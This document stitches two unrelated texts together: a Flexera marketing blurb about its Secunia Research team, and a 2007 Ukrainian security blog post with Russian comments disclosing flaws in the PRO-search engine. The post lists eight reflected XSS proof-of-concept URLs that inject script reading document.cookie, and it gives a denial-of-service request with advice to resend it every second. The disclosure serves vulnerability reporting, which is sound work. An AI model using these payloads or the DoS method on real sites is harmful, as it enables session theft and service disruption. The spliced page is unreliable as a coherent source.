How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## [Уразливості в PRO-search](http://websecurity.com.ua/1259/ "Permanent Link: Уразливості в PRO-search")

19:22 24.12.2007

**19.08.2007**

Раніше я вже писав про [XSS уразливість в PRO-search](/1224/). І ось нещодавно, 11.08.2007, я знайшов нові уразливості в пошуковому движку PRO-search. Всього виявив 8 Cross-Site Scripting та одну Denial of Service уразливість.

Деталі уразливостей з’являться пізніше. Розробнику системи я вже про них повідомив.

**24.12.2007**

XSS:

Уразливості на головній сторінці в параметрах prot, host, path, name, ext, size, search\_days, show\_page.

`http://site/?prot=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/?host=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/?path=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/?name=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/?ext=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/?size=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/?search_days=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E

http://site/?show_page=%27%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E`

Denial of Service:

http://site/?show\_page=20000&time=0

Пошуковець шукає по всім файлам, що може призвести до DoS (чим більше значення show\_page, тим більша затримка сервера). DoS короткотривалий, тому для проведення DoS атаки потрібно регулярно (щосекундно) посилати запит до сервера.

Уразливі версії PRO-search 0.17.x та усі попередні версії.

   Не подскажите как его установить

   очень интересно попробовать

   **lalex**

   Скачай веб приложение с сайта производителя и установи (следуя инструкциям разработчиков). И тогда попробуешь PRO-search ![;-)](http://websecurity.com.ua/wp-includes/images/smilies/icon_wink.gif) .

   При этом выкачай самую последнюю версию PRO-search. И если в ней не будут исправлены какие-либо из найденных мною уязвимостей, то тогда тебе нужно будет исправить их самому.

   <http://pro.setun.net/search/search/doc/doc.html> здесь нашол только под вин и ФриБСД машины, для моего любимого Линукса инструкций не нашол (возможно слеповат)

   если такой мануал существует прозьба дать линк

   P.S.(Спасибо за отписку на меил, полезный сервис)
4. [MustLive](http://websecurity.com.ua) каже:

   [Вівторок, 20:14 06.10.2009](#comment-303693)

   **lalex**, о наличии инструкций под Линукс для PRO-search мне ничего не известно, т.к. не пользуюсь данным веб приложением (и сам его не устанавливал). Лишь нашёл в нём дыры, когда выявил данное приложение на одном веб сайте ![;-)](http://websecurity.com.ua/wp-includes/images/smilies/icon_wink.gif) .

   Можешь обратиться к разработчику. Или самостотельно разобраться с установкой приложения (а имеющиеся инструкции под другие ОС могут мопочь).
